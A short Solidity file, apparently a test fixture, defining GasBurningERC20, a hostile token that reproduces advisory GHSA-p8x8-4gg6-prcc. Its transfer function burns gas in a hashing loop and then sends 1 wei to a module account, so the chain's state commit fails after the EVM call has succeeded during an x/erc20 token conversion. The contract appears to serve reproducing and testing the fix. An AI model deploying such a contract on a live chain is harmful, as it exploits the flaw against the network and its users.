// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @dev GasBurningERC20 reproduces GHSA-p8x8-4gg6-prcc: its transfer burns
/// `burnGas` gas (or all it is given), then sends 1 wei to a module account,
/// which the StateDB commit refuses after the EVM call succeeded. x/erc20
/// calls transfer through CallEVMWithData when converting the token.
contract GasBurningERC20 {
    string public constant name = "Gas Burner";
    string public constant symbol = "BURN";
    uint8 public constant decimals = 18;
    uint256 public constant totalSupply = 1e30;
    address payable public immutable moduleAccount;
    uint256 public immutable burnGas;
    uint256 public reserve;

    constructor(address payable moduleAccount_, uint256 burnGas_) payable {
        moduleAccount = moduleAccount_;
        burnGas = burnGas_;
    }

    function balanceOf(address) external pure returns (uint256) {
        return 1e24;
    }

    function allowance(address, address) external pure returns (uint256) {
        return type(uint256).max;
    }

    function approve(address, uint256) external pure returns (bool) {
        return true;
    }

    function transfer(address, uint256) external returns (bool) {
        uint256 start = gasleft();
        bytes32 digest = blockhash(block.number - 1);
        while (gasleft() > 40_000 && start - gasleft() < burnGas) {
            digest = keccak256(abi.encodePacked(digest));
        }
        reserve = uint256(digest);
        moduleAccount.transfer(1);
        return true;
    }

    function transferFrom(address, address, uint256) external pure returns (bool) {
        return false;
    }
}
